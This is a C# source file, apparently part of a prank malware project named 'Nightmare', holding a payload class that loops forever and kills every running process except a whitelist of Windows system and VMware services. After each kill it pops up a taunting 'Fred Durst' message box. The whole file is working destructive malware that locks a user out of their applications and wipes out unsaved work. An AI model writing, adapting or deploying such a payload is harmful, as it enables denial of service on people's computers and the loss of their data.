using System;
using System.Diagnostics;
using System.Threading;
using System.Windows.Forms;

namespace Nightmare.Payloads
{
    public class KillExe
    {
        public void KillProcess()
        {
            while (true)
            {
                Process[] processes = Process.GetProcesses();
                foreach (Process process in processes)
                {
                    try
                    {
                        if (process.ProcessName != "nightmare" && process.ProcessName != "explorer" &&
                            process.ProcessName != "audiodg" && process.ProcessName != "CompatTelRunner"
                            && process.ProcessName != "conhost" && process.ProcessName != "csrss" &&
                            process.ProcessName != "ctfmon" && process.ProcessName != "dllhost" &&
                            process.ProcessName != "dwm" && process.ProcessName != "fontdrvhost" &&
                            process.ProcessName != "lsass" && process.ProcessName != "MoUsoCoreWorker" &&
                            process.ProcessName != "MpCmdRun" && process.ProcessName != "msdtc" &&
                            process.ProcessName != "NisSrv" && process.ProcessName != "ntoskrnl" &&
                            process.ProcessName != "RuntimeBroker" && process.ProcessName != "SystemSettings" &&
                            process.ProcessName != "SystemSettingsBroker" && process.ProcessName != "SystemSettingsAdminFlows" &&
                            process.ProcessName != "ApplicationFrameHost" && process.ProcessName != "SystemSettingsAdminFlow" &&
                            process.ProcessName != "SearchApp" && process.ProcessName != "SearchIndexer" && process.ProcessName != "shutdown" &&
                            process.ProcessName != "SecurityHealthService" && process.ProcessName != "services" &&
                            process.ProcessName != "SgrmBroker" && process.ProcessName != "ShellExperienceHost" &&
                            process.ProcessName != "sihost" && process.ProcessName != "smartscreen" &&
                            process.ProcessName != "smss" && process.ProcessName != "spoolsv" &&
                            process.ProcessName != "StartMenuExperienceHost" && process.ProcessName != "svchost" &&
                            process.ProcessName != "ntoskrnl" && process.ProcessName != "System" &&
                            process.ProcessName != "System Idle Process" && process.ProcessName != "System interrupts" &&
                            process.ProcessName != "taskhostw" && process.ProcessName != "TextInputHost" &&
                            process.ProcessName != "TiWorker" && process.ProcessName != "TrustedInstaller" &&
                            process.ProcessName != "UserOOBEBroker" && process.ProcessName != "VGAuthService" &&
                            process.ProcessName != "vm3dservice" && process.ProcessName != "vmtoolsd" &&
                            process.ProcessName != "wininit" && process.ProcessName != "winlogon" &&
                            process.ProcessName != "WmiPrvSE" && process.ProcessName != "WmiPrvSE" &&
                            process.ProcessName != "wuauclt")
                        {
                            process.Kill();
                            Thread thMessage = new Thread(Message);
                            thMessage.Start(); thMessage.Abort();
                        }
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine("Error: ");
                        Console.WriteLine(e);
                        throw;
                    }
                    Thread.Sleep(1);
                }
            }
        }

        public void Message()
        {
            MessageBox.Show("fred durst says: no computer today silly boy go outside to play",
                "(1) New Message From Fred Durst",
                MessageBoxButtons.OK,
                MessageBoxIcon.Warning);
        }
    }
}